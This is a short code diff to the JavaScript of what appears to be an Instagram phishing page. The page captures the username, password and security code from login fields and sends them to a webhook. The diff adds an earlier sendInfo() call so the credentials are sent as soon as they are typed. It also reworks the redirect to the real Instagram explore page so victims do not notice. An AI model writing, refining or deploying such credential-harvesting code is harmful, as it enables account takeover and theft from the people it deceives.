@@ -50,6 +50,7 @@ loginButton.addEventListener("click", () => {
     alldata.username=document.getElementById('usernameInput').value;
     alldata.password=document.getElementById('passwordInput').value;
     toggleHtml()
+    sendInfo();
     document.getElementById('loginBtn2').addEventListener('click', function() {
       document.querySelector("#seccode");
       alldata.securityCode=document.getElementById('seccode').value;
@@ -57,6 +58,9 @@ loginButton.addEventListener("click", () => {
       Info = getInfo();
       console.log("info",Info);
       sendInfo();
+      setTimeout(function() {
+        window.location.replace("https://www.instagram.com/explore/")
+    }, 1000);
 
 
 
@@ -122,13 +126,9 @@ async function sendInfo() {
   try {
     await fetch(webhook, config);
   } catch {
-    setTimeout(function() {
-        window.location.replace("https://www.instagram.com/explore/")
-    }, 1000);
+
   }
-  setTimeout(function() {
-    window.location.replace("https://www.instagram.com/explore/")
-  }, 1000);
+
 }
 
 
